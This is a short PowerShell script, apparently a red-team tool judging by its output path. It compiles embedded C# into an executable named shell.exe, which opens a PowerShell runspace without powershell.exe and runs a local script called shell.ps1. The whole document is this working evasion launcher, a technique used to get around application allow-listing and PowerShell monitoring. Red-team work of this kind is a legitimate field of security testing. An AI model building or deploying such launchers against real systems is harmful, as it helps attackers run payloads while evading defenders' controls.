$DotnetCode = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;


public class Runspace
{
    static void Main()
    {
	  	System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
	    run.Open();

	    System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
	    shell.Runspace = run;

	    String exec = @"C:\temp\shell.ps1";
	    shell.AddScript(exec);
	    shell.Invoke();
	    run.Close();

    }
}
"@

Add-Type -TypeDefinition $DotnetCode -OutputType ConsoleApplication -OutputAssembly "C:\users\user\Desktop\red team\shell.exe"
